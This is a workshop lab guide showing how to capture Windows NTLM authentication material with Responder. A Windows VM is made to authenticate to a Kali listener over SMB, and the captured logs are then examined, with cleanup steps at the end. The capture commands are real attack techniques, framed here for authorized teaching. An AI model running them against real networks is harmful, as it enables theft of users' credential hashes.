# Lab 1.1 — Active Online Attack Using Responder

## 🎯 Objective

Demonstrate how Windows NTLM authentication can expose authentication material when a Windows system is induced to authenticate to a controlled service.

## 🧪 Requirements

* Kali Linux
* Windows laboratory VM
* Responder
* Isolated VMware network
* Administrator access to the Windows VM

> ⚠️ Perform this demonstration only in the authorized workshop laboratory.

---

## Step 1 — Create a Laboratory User

Open **Command Prompt as Administrator** on Windows:

```cmd
net user ntlm_lab * /add
```

Enter a password when prompted.

Verify the account:

```cmd
net user ntlm_lab
```

---

## Step 2 — Start Responder

On Kali:

```bash
sudo responder -I eth0
```

Responder will begin listening for supported authentication requests.

Leave Responder running.

---

## Step 3 — Trigger an Authentication Request

From the Windows machine, access the controlled laboratory share/path:

```cmd
dir \\<KALI-IP>\share
```

Replace `<KALI-IP>` with the IP address of the Kali VM.

For example:

```cmd
dir \\192.168.153.130\share
```

---

## Step 4 — Test the Laboratory Account

```cmd
net use \\<KALI-IP>\share /user:<WINDOWS-HOSTNAME>\ntlm_lab
```

Example:

```cmd
net use \\192.168.153.130\share /user:DESKTOP-LAB\ntlm_lab
```

Enter the password created in Step 1.

---

## Step 5 — Examine Responder Logs

On Kali, stop Responder with:

```text
Ctrl+C
```

Then:

```bash
sudo ls -lah /usr/share/responder/logs/
```

The directory contains files generated by the demonstration.

---

## 🧠 What You Learned

This demonstration shows:

* How NTLM authentication works at a high level
* Why legacy authentication protocols can expose authentication material
* How network authentication can be abused in an authorized penetration test
* Why organizations should minimize unnecessary NTLM usage

## 🧹 Cleanup

Remove the temporary Windows account:

```cmd
net user ntlm_lab /delete
```

Verify:

```cmd
net user ntlm_lab
```

The account should no longer exist.
